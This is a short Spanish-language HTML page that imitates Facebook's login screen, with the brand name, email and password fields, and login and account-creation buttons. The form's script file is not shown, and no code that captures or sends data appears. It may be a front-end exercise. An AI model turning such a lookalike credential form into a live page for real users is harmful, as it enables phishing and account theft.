<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Facebook - Iniciar sesión</title>
    <link rel="stylesheet" href="estilos.css">
</head>
<body>
    <div class="login-container">
        <h1>facebook</h1>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Correo electrónico o teléfono" required>
            <input type="password" id="password" placeholder="Contraseña" required>
            <button type="submit" id="btn-login">Iniciar sesión</button>
            <a href="#">¿Olvidaste tu contraseña?</a>
            <hr>
            <button type="button" id="btn-registrar">Crear cuenta nueva</button>
        </form>
    </div>
    
    <script src="app.js"></script>
</body>
</html>
